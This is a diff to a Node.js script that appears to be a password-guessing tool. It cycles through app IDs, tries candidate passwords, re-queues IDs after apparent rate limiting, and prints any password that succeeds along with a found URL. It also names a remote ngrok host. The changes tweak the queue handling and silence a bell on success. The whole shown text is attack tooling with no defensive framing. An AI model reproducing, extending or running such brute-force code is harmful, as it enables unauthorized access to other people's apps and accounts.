@@ -3,7 +3,7 @@ var fs = require('fs');
 var https = require('https');
 var crypto = require('crypto');
 
-var VERSION = 3;
+var VERSION = 4;
 
 var remote = 'warg.ngrok.io';
 
@@ -67,6 +67,7 @@ function checkPassword(password, callback) {
 		}
 
 		var appID = left[0];
+		left.splice(0, 1);
 
 		tester.tryPassword(password, appID, function(err, result) {
 			if (err) {
@@ -74,9 +75,8 @@ function checkPassword(password, callback) {
 				left.splice(0, 0, appID);
 			} else {
 				rateLimited = false;
-				left.splice(left.indexOf(appID), 1);
 				if (result) {
-					process.stdout.write('\x07');
+					//process.stdout.write('\x07');
 					if (result.url) {
 						console.log('[found url] app=' + appID + ', password=' + password + ', url=' + result.url + '\n');
 					} else if (result.response) {
